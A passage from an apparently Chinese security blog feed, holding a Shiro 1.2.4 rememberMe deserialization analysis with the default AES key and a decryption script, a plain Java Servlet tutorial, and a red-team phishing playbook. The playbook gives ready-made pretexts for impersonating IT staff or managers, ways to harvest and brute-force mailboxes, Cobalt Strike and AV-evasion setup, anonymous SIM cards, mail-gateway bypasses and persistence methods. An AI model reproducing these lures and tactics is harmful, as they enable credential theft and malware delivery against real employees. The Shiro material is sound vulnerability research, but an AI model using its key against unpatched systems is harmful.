alt></p><p>将我们的war包放在tomcat目录下，启动tomcat，访问地址：<br><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/tomcat.png" alt></p><p>环境搭建成go0o0ong</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>整个漏洞点如下：<br>cookie -&gt; base64解码 -&gt; AES解密 -&gt; 反序列化</p><p>首先来看看我们的cookie，登陆之后抓包，获取rememberMe<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rememberMe=0DOaI2x90RcR5SP6rCnGX1cT2ZUVv4Mq2iH3/6ZNvUuZkWDgPvsvJ5nTlO69Z3u2X6Wtb+7a7B+D0D9KILfHdtQHro9fUqiWtjkUeP2Y8ca7nbY9JPCcaEBkExk8+thVsa2DCCL9NpL+WQTxGz/UXSpevdEIU4RKmO98G5qEgI0vIaAbtLwb1FLuIm2x2JBqmqV+LEpE/Ag4mEhP99lfHhPIMK5ZLt1z7F9iFv2XKLU4tdx7LDqQwcEpNgIny5EfplmnUWUoJQoR7hOjaa0FDILqz6AXbKw5CqymWQho4TAsnYrnBpAw5iBNLB9b5Z7zux8wSFsbc8atLBAG16qiepj0mIf4GeNMoSMWJTEVYu9gdkJxeKkgXACa8L8M73a1lcH2OD1ye8N9i6fi6T/Te+VeJjB1+wknwMzvO/v4M+L+JZ6A0GXx0V6Z60U2E/7Tdytz2EJoLwzXnzstjAHZOL2OXLF9gGxN+kfRom7iTOci6eytPaP9OsPomLEMxrDs</span><br></pre></td></tr></table></figure></p><p>这个应该是base64加密后的内容，利用python解密以二进制的格式进行保存，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">b4 = &quot;0DOaI2x90RcR5SP6rCnGX1cT2ZUVv4Mq2iH3/6ZNvUuZkWDgPvsvJ5nTlO69Z3u2X6Wtb+7a7B+D0D9KILfHdtQHro9fUqiWtjkUeP2Y8ca7nbY9JPCcaEBkExk8+thVsa2DCCL9NpL+WQTxGz/UXSpevdEIU4RKmO98G5qEgI0vIaAbtLwb1FLuIm2x2JBqmqV+LEpE/Ag4mEhP99lfHhPIMK5ZLt1z7F9iFv2XKLU4tdx7LDqQwcEpNgIny5EfplmnUWUoJQoR7hOjaa0FDILqz6AXbKw5CqymWQho4TAsnYrnBpAw5iBNLB9b5Z7zux8wSFsbc8atLBAG16qiepj0mIf4GeNMoSMWJTEVYu9gdkJxeKkgXACa8L8M73a1lcH2OD1ye8N9i6fi6T/Te+VeJjB1+wknwMzvO/v4M+L+JZ6A0GXx0V6Z60U2E/7Tdytz2EJoLwzXnzstjAHZOL2OXLF9gGxN+kfRom7iTOci6eytPaP9OsPomLEMxrDs&quot;</span><br><span class="line"></span><br><span class="line">temp = base64.b64decode(b4)</span><br><span class="line"></span><br><span class="line">with open(&quot;rem.bin&quot;,&quot;w+&quot;) as f:</span><br><span class="line">f.write(temp)</span><br></pre></td></tr></table></figure></p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/bin.png" alt><br>我们查看二进制内容，并没有发现反序列化的特征，由于漏洞中出现了AES加密，这里猜测应该要进行解密才能看见，跟进代码。我们需要找到AES的加密方式(mode)，加密的秘钥(key)以及加密的向量(iv)</p><p>官方文档里有写问题类为CookieRememberMeManager：<br><a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener">https://issues.apache.org/jira/browse/SHIRO-550</a></p><p>其中有一个getRememberedSerializedIdentity方法，看起来和我们的RememberMe以及反序列化都有关系，我们在这个函数下断点</p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/1.png" alt><br>成功截断，继续跟踪代码，依然还是这个方法中，我们看到将我们requests中的RememberMe赋值给了base64字符串，然后将这个字符串进行解码，解码之后变成了byte格式。<br><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/2.png" alt></p><p>继续跟踪代码，来到了getRememberedPrincipals函数，调用了convertBytesToPrincipals函数，继续跟进</p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/3.png" alt></p><p>跟进decrypt</p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/4.png" alt></p><p>跟进getDecryptionCipherKey，会返回decryptionCipherKey，其实这里就等于DEFAULT_CIPHER_KEY_BYTES，也就是我们一直寻找的秘钥</p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/5.png" alt><br>这里的秘钥为：kPH+bIxk5D2deZiIxcaaaA==</p><p>我们回到decrypt函数<br><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/6.png" alt><br>这里我们可以看见我们的向量(iv)为16字节，并且内容为RememberMe通过base64解密后的前16位，后面即为我们的反序列化内容</p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/6.png" alt></p><p>继续跟进来到JcaCipherService的crypt方法，调用initNewCipher，跟进<br><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/7.png" alt></p><p>我们看到这里的加密方式为CBC，至此我们解密所需的内容全部收集完毕，我们可以写脚本来进行测试。</p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/8.png" alt><br>这里尝试解密rememberMe，base64解码之后用网上的脚本进行AES解密一直不成功，折腾了好几天一直报错，后来想着可能吧解密的内容写入文件再读取可能有问题，后来改了下网上的脚本，直接base64解码进行AES解码，这样就不报错了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># pip install pycrypto</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def decode_rememberme_file():</span><br><span class="line">    key  =  &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    IV   = b&apos; &apos; * 16</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, IV=IV)</span><br><span class="line">    rem = &quot;0DOaI2x90RcR5SP6rCnGX1cT2ZUVv4Mq2iH3/6ZNvUuZkWDgPvsvJ5nTlO69Z3u2X6Wtb+7a7B+D0D9KILfHdtQHro9fUqiWtjkUeP2Y8ca7nbY9JPCcaEBkExk8+thVsa2DCCL9NpL+WQTxGz/UXSpevdEIU4RKmO98G5qEgI0vIaAbtLwb1FLuIm2x2JBqmqV+LEpE/Ag4mEhP99lfHhPIMK5ZLt1z7F9iFv2XKLU4tdx7LDqQwcEpNgIny5EfplmnUWUoJQoR7hOjaa0FDILqz6AXbKw5CqymWQho4TAsnYrnBpAw5iBNLB9b5Z7zux8wSFsbc8atLBAG16qiepj0mIf4GeNMoSMWJTEVYu9gdkJxeKkgXACa8L8M73a1lcH2OD1ye8N9i6fi6T/Te+VeJjB1+wknwMzvO/v4M+L+JZ6A0GXx0V6Z60U2E/7Tdytz2EJoLwzXnzstjAHZOL2OXLF9gGxN+kfRom7iTOci6eytPaP9OsPomLEMxrDs&quot;</span><br><span class="line">    b_rem = base64.b64decode(rem);</span><br><span class="line">    print(b_rem)</span><br><span class="line">    remember_bin = encryptor.decrypt(b_rem)</span><br><span class="line">    return remember_bin</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    with open(&quot;decrypt.bin&quot;, &apos;wb+&apos;) as fpw:</span><br><span class="line">        fpw.write(decode_rememberme_file())</span><br></pre></td></tr></table></figure><p>写入文件读取报错如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ValueError: Data must be padded to 16 byte boundary in CBC mode</span><br></pre></td></tr></table></figure></p><p>然后在linux下利用hexdump查看文件内容，发现我们反序列化的特征啦:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">00000000  06 77 dd c9 34 6e 00 17  77 18 a4 48 82 18 cf ee  |.w..4n..w..H....|</span><br><span class="line">00000010  ac ed 00 05 73 72 00 32  6f 72 67 2e 61 70 61 63  |....sr.2org.apac|</span><br><span class="line">00000020  68 65 2e 73 68 69 72 6f  2e 73 75 62 6a 65 63 74  |he.shiro.subject|</span><br><span class="line">00000030  2e 53 69 6d 70 6c 65 50  72 69 6e 63 69 70 61 6c  |.SimplePrincipal|</span><br><span class="line">00000040  43 6f 6c 6c 65 63 74 69  6f 6e a8 7f 58 25 c6 a3  |Collection..X%..|</span><br><span class="line">00000050  08 4a 03 00 01 4c 00 0f  72 65 61 6c 6d 50 72 69  |.J...L..realmPri|</span><br><span class="line">00000060  6e 63 69 70 61 6c 73 74  00 0f 4c 6a 61 76 61 2f  |ncipalst..Ljava/|</span><br><span class="line">00000070  75 74 69 6c 2f 4d 61 70  3b 78 70 73 72 00 17 6a  |util/Map;xpsr..j|</span><br><span class="line">00000080  61 76 61 2e 75 74 69 6c  2e 4c 69 6e 6b 65 64 48  |ava.util.LinkedH|</span><br><span class="line">00000090  61 73 68 4d 61 70 34 c0  4e 5c 10 6c c0 fb 02 00  |ashMap4.N\.l....|</span><br><span class="line">000000a0  01 5a 00 0b 61 63 63 65  73 73 4f 72 64 65 72 78  |.Z..accessOrderx|</span><br><span class="line">000000b0  72 00 11 6a 61 76 61 2e  75 74 69 6c 2e 48 61 73  |r..java.util.Has|</span><br><span class="line">000000c0  68 4d 61 70 05 07 da c1  c3 16 60 d1 03 00 02 46  |hMap......`....F|</span><br><span class="line">000000d0  00 0a 6c 6f 61 64 46 61  63 74 6f 72 49 00 09 74  |..loadFactorI..t|</span><br><span class="line">000000e0  68 72 65 73 68 6f 6c 64  78 70 3f 40 00 00 00 00  |hresholdxp?@....|</span><br><span class="line">000000f0  00 0c 77 08 00 00 00 10  00 00 00 01 74 00 08 69  |..w.........t..i|</span><br><span class="line">00000100  6e 69 52 65 61 6c 6d 73  72 00 17 6a 61 76 61 2e  |niRealmsr..java.|</span><br><span class="line">00000110  75 74 69 6c 2e 4c 69 6e  6b 65 64 48 61 73 68 53  |util.LinkedHashS|</span><br><span class="line">00000120  65 74 d8 6c d7 5a 95 dd  2a 1e 02 00 00 78 72 00  |et.l.Z..*....xr.|</span><br><span class="line">00000130  11 6a 61 76 61 2e 75 74  69 6c 2e 48 61 73 68 53  |.java.util.HashS|</span><br><span class="line">00000140  65 74 ba 44 85 95 96 b8  b7 34 03 00 00 78 70 77  |et.D.....4...xpw|</span><br><span class="line">00000150  0c 00 00 00 10 3f 40 00  00 00 00 00 01 74 00 04  |.....?@......t..|</span><br><span class="line">00000160  72 6f 6f 74 78 78 00 77  01 01 71 00 7e 00 05 78  |rootxx.w..q.~..x|</span><br><span class="line">00000170  10 10 10 10 10 10 10 10  10 10 10 10 10 10 10 10  |................|</span><br><span class="line">00000180</span><br></pre></td></tr></table></figure></p><p>继续跟踪先前的代码，会来到convertBytesToPrincipals函数</p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/9.png" alt></p><p>跟进deserialize函数，找到我们的漏洞点：</p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/10.png" alt></p><p>蛮好的哈~</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/three_feng/article/details/52189559" title="SHIRO-550 反序列化漏洞分析" target="_blank" rel="noopener">SHIRO-550 反序列化漏洞分析</a></p><p><a href="https://paper.seebug.org/shiro-rememberme-1-2-4" title="https://paper.seebug.org/shiro-rememberme-1-2-4" target="_blank" rel="noopener">【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;官方issue:&lt;br&gt;&lt;a href=&quot;https://issues.apache.org/jira/browse/SHIRO-550&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://issues.apache.org/jira/brows
      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>IDEA新建Servlet</title>
    <link href="http://sherlocz.github.io/2020/07/05/IDEA%E6%96%B0%E5%BB%BAServlet/"/>
    <id>http://sherlocz.github.io/2020/07/05/IDEA新建Servlet/</id>
    <published>2020-07-05T06:28:48.000Z</published>
    <updated>2020-07-05T07:44:35.739Z</updated>
    
    <content type="html"><![CDATA[<p>Servlet为Server Applet，即服务器在启动时会运行的小程序。</p><p>通俗点说就是，Servlet本身就是一个接口，这个接口里面定义了会被tomcat容器解析的规则，那么我们若新建一个类，里面复写了servlet的方法，就可以被tomcat解析出来。</p><h1 id="IDEA与Tomcat联动"><a href="#IDEA与Tomcat联动" class="headerlink" title="IDEA与Tomcat联动"></a>IDEA与Tomcat联动</h1><p>点击Run—&gt;Debug-&gt;Edit Configuaration-&gt;+(Add New Comfiguaration)<br>选中Tomcat-&gt;local，箭头处选中你Tomcat安装的路径Apply保存。<br><img src="/2020/07/05/IDEA新建Servlet/tomcat.png" alt></p><p>然后File-&gt;New Module，新建一个Web Application<br><img src="/2020/07/05/IDEA新建Servlet/web.png" alt></p><p>新建好之后目录结构如下：<br><img src="/2020/07/05/IDEA新建Servlet/ok.png" alt></p><p>点击Shift+F10运行起来，这个时候我们的index.jsp被成功运行起来了<br><img src="/2020/07/05/IDEA新建Servlet/8888.png" alt></p><p>箭头所示的地方可以自定义我们访问的url路径。<br><img src="/2020/07/05/IDEA新建Servlet/url.png" alt></p><h1 id="创建Servlet"><a href="#创建Servlet" class="headerlink" title="创建Servlet"></a>创建Servlet</h1><p>首先我们在src目录下新建一个包，然后新建一个ServletDemo.class，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">package cn.s1.web.servlet;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class ServletDemo implements Servlet &#123;</span><br><span class="line">/*Servlet初始化时运行，只运行一次*/</span><br><span class="line">    @Override</span><br><span class="line">    public void init(ServletConfig servletConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">/*获取servlet的配置信息*/</span><br><span class="line">    @Override</span><br><span class="line">    public ServletConfig getServletConfig() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">/*每次servlet被访问时运行一次*/</span><br><span class="line">    @Override</span><br><span class="line">    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;Hello Servlet!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">/*获取servlet的一些信息*/</span><br><span class="line">    @Override</span><br><span class="line">    public String getServletInfo() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">/*在服务器关闭的时候运行*/</span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>首先我们需要将这个类implements Servlet，由于Servlet这个接口有抽象类的方法，我们在集成的时候需要重写，这里我重写service这个方法输出了一行字。</p><p>然后我们需要配置web.xml，在其中设置好我们servlet的路径和解析的类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span><br><span class="line">         version=&quot;3.1&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">//设置servlet名称</span><br><span class="line">        &lt;servlet-name&gt;Demo&lt;/servlet-name&gt;</span><br><span class="line">//设置对应的class类</span><br><span class="line">        &lt;servlet-class&gt;cn.s1.web.servlet.ServletDemo&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;Demo&lt;/servlet-name&gt;</span><br><span class="line">//Demo这个servlet解析时候需要访问的url地址</span><br><span class="line">        &lt;url-pattern&gt;/Demo&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure></p><p>这个时候我们再运行该项目，访问<a href="http://localhost:8888/Demo，结果如下：" target="_blank" rel="noopener">http://localhost:8888/Demo，结果如下：</a><br><img src="/2020/07/05/IDEA新建Servlet/url.png" alt><br>结果为空白，我们看控制台输出的信息：<br><img src="/2020/07/05/IDEA新建Servlet/hello.png" alt></p><p>和我们重写的service方法打印的字符串一样，说明创建成功！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Servlet为Server Applet，即服务器在启动时会运行的小程序。&lt;/p&gt;
&lt;p&gt;通俗点说就是，Servlet本身就是一个接口，这个接口里面定义了会被tomcat容器解析的规则，那么我们若新建一个类，里面复写了servlet的方法，就可以被tomcat解析出来。&lt;
      
    
    </summary>
    
    
    
      <category term="JAVA" scheme="http://sherlocz.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>钓鱼小结</title>
    <link href="http://sherlocz.github.io/2020/06/24/%E9%92%93%E9%B1%BC%E5%B0%8F%E7%BB%93/"/>
    <id>http://sherlocz.github.io/2020/06/24/钓鱼小结/</id>
    <published>2020-06-24T09:15:32.000Z</published>
    <updated>2020-07-18T11:29:19.444Z</updated>
    
    <content type="html"><![CDATA[<p>随着攻防演练的进行，外网能够挖掘到的漏洞必然会越来越少，而且常规Web渗透耗时长，这个时候利用钓鱼攻击不仅效率高，并且能够为我们节省大量的时间和人力，说不定未来钓鱼攻击会成为每个一线渗透人员必须掌握的技能。</p><p>钓鱼的手法有很多种，其中我们会遇到各种各样的问题，要去不断的进行尝试，反思。</p><p><img src="/2020/06/24/钓鱼小结/钓鱼.png" alt></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>前期的准备是为了让我们有充足的时间去思考会发生的各种问题，而在我们没有收集到足够信息之前，建议不要盲目进行钓鱼。</p><h2 id="突破口选择"><a href="#突破口选择" class="headerlink" title="突破口选择"></a>突破口选择</h2><p>钓鱼需要一个下手的地方，对于我们的目标，通常会有多个钓鱼的口子供我们选择，如：</p><ul><li>QQ/微信(群)钓鱼</li><li>客服钓鱼</li><li>邮件钓鱼</li><li>电话钓鱼</li><li>……</li></ul><p>想到了可以突破的点，我们就需要去搜寻相关信息。</p><h3 id="QQ-微信群收集"><a href="#QQ-微信群收集" class="headerlink" title="QQ/微信群收集"></a>QQ/微信群收集</h3><p>很多公司都会开放对外的客服群、售后群、活动群甚至内部员工群、公司群，通过QQ或者其他的搜索方式多多少少都能搜索到群聊，伪装成员工或者客服进群聊。<br><img src="/2020/06/24/钓鱼小结/QQ群.png" alt></p><p>如何伪装进入群聊：<br>1、修改个人信息为员工/客户信息(包括姓名、签名、头像等等)<br>2、提前半个月或者一个月进入群聊(攻防演练阶段进去的可能性不大)</p><h3 id="邮箱收集"><a href="#邮箱收集" class="headerlink" title="邮箱收集"></a>邮箱收集</h3><p>邮箱的收集会很重要，所以尽量收集全面一点，最好能够弄到邮箱的账号密码，对后期钓鱼很有用，整体思路如下：<br><img src="/2020/06/24/钓鱼小结/邮箱收集.png" alt></p><p>邮箱收集网址和工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bit4woo/teemo</span><br><span class="line">https://github.com/laramies/theHarvester</span><br><span class="line">https://www.email-format.com/i/search/</span><br></pre></td></tr></table></figure></p><p>邮箱验证网址和工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://mailtester.com/testmail.php</span><br><span class="line">https://github.com/Tzeross/verifyemail</span><br></pre></td></tr></table></figure></p><p>邮箱爆破工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shack2/SNETCracker</span><br><span class="line">brupsuite</span><br></pre></td></tr></table></figure></p><p>推荐使用pop/smtp协议爆破，web端爆破可能会产生告警</p><h2 id="其他信息调研"><a href="#其他信息调研" class="headerlink" title="其他信息调研"></a>其他信息调研</h2><p>除了上述我们收集的目标信息，我们还需要尽可能的调研到以下几点：</p><ul><li><p>组织架构<br>部门领导信息、信息技术部成员信息、运维人员信息、新入职员工信息…</p></li><li><p>安全设备部署情况<br>TSM、HIDS、天眼、 EDR、赛门铁克、360、卡巴斯基…</p></li><li><p>……</p></li></ul><h1 id="钓鱼准备"><a href="#钓鱼准备" class="headerlink" title="钓鱼准备"></a>钓鱼准备</h1><h2 id="邮件服务器"><a href="#邮件服务器" class="headerlink" title="邮件服务器"></a>邮件服务器</h2><p>搭建邮服是为了方便我们发送钓鱼邮件，准备两台邮件服务器，一主一备。<br><img src="/2020/06/24/钓鱼小结/ewomail.png" alt></p><ul><li><p>邮服搭建：<br><a href="https://www.iredmail.com/" target="_blank" rel="noopener">https://www.iredmail.com/</a><br><a href="http://www.ewomail.com/" target="_blank" rel="noopener">http://www.ewomail.com/</a></p></li><li><p>服务器选择：<br>阿里云、华为云等大型服务厂商会禁止搭建邮服，可以选择小型服务器提供商</p></li><li><p>伪装域名：<br>com/cn/co这样的后缀可以，top/me/xyz后缀容易被识破</p></li><li><p>SSL证书：<br>防止被归类为垃圾邮件</p></li></ul><h2 id="邮件正文编写"><a href="#邮件正文编写" class="headerlink" title="邮件正文编写"></a>邮件正文编写</h2><ul><li><p>标题<br>可以在标题上加上【紧急通知】字眼，催促对方查看邮件</p></li><li><p>正文主题<br>HW终端加固方案<br>内部软件更新包</p></li><li><p>签名<br>很多公司都会有各自的签名，我们前期搞到一个邮箱的账号密码，就知道签名是什么样子了。</p></li><li><p>附件<br>木马附件添加压缩密码，压缩码直接写在正文中或者用图片格式插入。</p></li></ul><h2 id="CS服务器配置"><a href="#CS服务器配置" class="headerlink" title="CS服务器配置"></a>CS服务器配置</h2><ul><li>修改随机端口+密码</li><li>修改SSL证书</li><li>配置Malleable-C2-Profiles（隐藏隧道、伪装流量）</li><li>配置Server酱上线通知</li><li>使用便捷cna插件(on beacon_initial )</li><li>删除空格后门</li></ul><h2 id="免杀木马"><a href="#免杀木马" class="headerlink" title="免杀木马"></a>免杀木马</h2><p>对于前期调研的内部安全防护工具，针对性的制作免杀木马，减少在免杀上面花费的时间。</p><ul><li>二进制免杀</li><li>静态免杀</li><li>动态免杀</li></ul><p><a href="https://github.com/TideSec/BypassAntiVirus" target="_blank" rel="noopener">https://github.com/TideSec/BypassAntiVirus</a></p><h2 id="匿名手机卡"><a href="#匿名手机卡" class="headerlink" title="匿名手机卡"></a>匿名手机卡</h2><p>用来进行电话钓鱼，防止被防守队溯源</p><ul><li>阿里小号（<a href="https://aliqin.tmall.com/）" target="_blank" rel="noopener">https://aliqin.tmall.com/）</a></li><li>寻找卡商购买匿名卡</li></ul><h2 id="绕过邮件网关"><a href="#绕过邮件网关" class="headerlink" title="绕过邮件网关"></a>绕过邮件网关</h2><p>有的时候我们发送的邮件会被拒收或者拦截，我们要尝试绕过：</p><ul><li>附件密码以图片形式插入，而非直接写在正文当中</li><li>附件和附件密码分开发送</li><li>不接收有附件的邮件，百度网盘，火狐网盘插入到正文当中</li></ul><h1 id="诱导"><a href="#诱导" class="headerlink" title="诱导"></a>诱导</h1><h2 id="安全意识"><a href="#安全意识" class="headerlink" title="安全意识"></a>安全意识</h2><p>我们在诱导的前期可以检查目标员工是否有安全意识，可以先发一个无毒文件过去，若验证对方没有很强的安全意识，我们可以再发木马过去，减少被发现钓鱼攻击的可能性。</p><h2 id="话语诱导"><a href="#话语诱导" class="headerlink" title="话语诱导"></a>话语诱导</h2><ul><li><p>伪装客户诱导客服<br>你们的xxx系统/app无法登陆，我发个截图给你们看吧！<br>请你们配合我的工作！不要耽误我的时间！</p></li><li><p>伪装运维人员诱导员工<br>你好，我是(信息)安全/管理部门的xxx，后台监测到您的电脑触发了告警，请使用我们提供的工具进行清理。<br>你好，我们后台监控到您的vpn存在异常，请提供账号密码（验证码）！情况紧急！</p></li><li><p>伪装上级诱导下属员工<br>我给你发了个表格，尽快帮我整理好，等会开会需要。</p></li><li><p>伪装钓鱼邮件被发现，进行回击<br>再发一封邮件：《关于近期收到钓鱼邮件应对措施》<br>由于近期钓鱼事件频发，为了避免公司内部网络木马感染，请运行公司下发的清理程序。<br>后台会实时监控您是否运行了程序，纳入绩效考核！请立即运行程序清理！</p></li></ul><h2 id="xss漏洞诱导"><a href="#xss漏洞诱导" class="headerlink" title="xss漏洞诱导"></a>xss漏洞诱导</h2><p>XSS配合Flash或者自制木马进行钓鱼<br><a href="https://github.com/r00tSe7en/Fake-flash.cn" target="_blank" rel="noopener">https://github.com/r00tSe7en/Fake-flash.cn</a></p><h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><p>我们会遇到员工下班关机或者使用的是云桌面，这个时候我们的权限第二天可能就没了，需要做好权限维持进行后续的内网渗透。</p><p>常见权限维持方法：</p><ul><li>修改注册表</li><li>修改服务（包括svchost-x…）</li><li>配置启动项</li><li>配置计划任务</li><li>Dll劫持(白加黑)</li><li>PE感染<br>……</li></ul><p>结合CS插件进行权限维持：<br><a href="https://github.com/0xthirteen/StayKit" target="_blank" rel="noopener">https://github.com/0xthirteen/StayKit</a><br><a href="https://github.com/0xthirteen/MoveKit" target="_blank" rel="noopener">https://github.com/0xthirteen/MoveKit</a></p><h1 id="后期复盘"><a href="#后期复盘" class="headerlink" title="后期复盘"></a>后期复盘</h1><p>后期需要对钓鱼的人员、获取的信息、木马的名称、邮箱的附件进行统计，方便后续的复盘以及清理。</p><p>总结钓鱼中出现的问题，进行讨论给出解决方案，避免问题再次出现。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;随着攻防演练的进行，外网能够挖掘到的漏洞必然会越来越少，而且常规Web渗透耗时长，这个时候利用钓鱼攻击不仅效率高，并且能够为我们节省大量的时间和人力，说不定未来钓鱼攻击会成为每个一线渗透人员必须掌握的技能。&lt;/p&gt;
&lt;p&gt;钓鱼的手法有很多种，其中我们会遇到各种各样的问题，要
      
    
    </summary>
    
    
    
      <category term="钓鱼" scheme="http://sherlocz.github.io/tags/%E9%92%93%E9%B1%BC/"/>
    
  </entry>
  
  <entry>
    <title>DPAPI学习记录</title>
    <link href="http://sherlocz.github.io/2020/06/24/DPAPI%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://sherlocz.github.io/2020/06/24/DPAPI学习记录/</id>
    <published>2020-06-24T08:14:28.000Z</published>
    <updated>2020-06-29T03:28:55.815Z</updated>
    
